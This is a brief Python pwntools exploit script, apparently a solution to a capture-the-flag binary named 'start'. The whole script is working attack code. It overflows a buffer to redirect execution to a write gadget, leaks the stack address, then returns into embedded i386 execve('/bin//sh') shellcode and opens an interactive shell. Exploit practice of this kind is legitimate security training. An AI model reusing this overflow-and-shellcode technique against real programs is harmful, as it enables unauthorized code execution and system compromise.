from pwn import *

r = process("./start")
context.arch = 'i386'
shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#send to return sys_write
r.recvuntil(b"CTF:")
sys_write = 0x08048087
payload = b'a' * 20 + p32(sys_write)
r.send(payload)

#To send shellcode
esp_addr = u32(r.recv()[:4]) # leak esp <= esp_addr consist shellcode to execute
payload = b'a' * 20 + p32(esp_addr+20) + shellcode
r.send(payload)

r.interactive()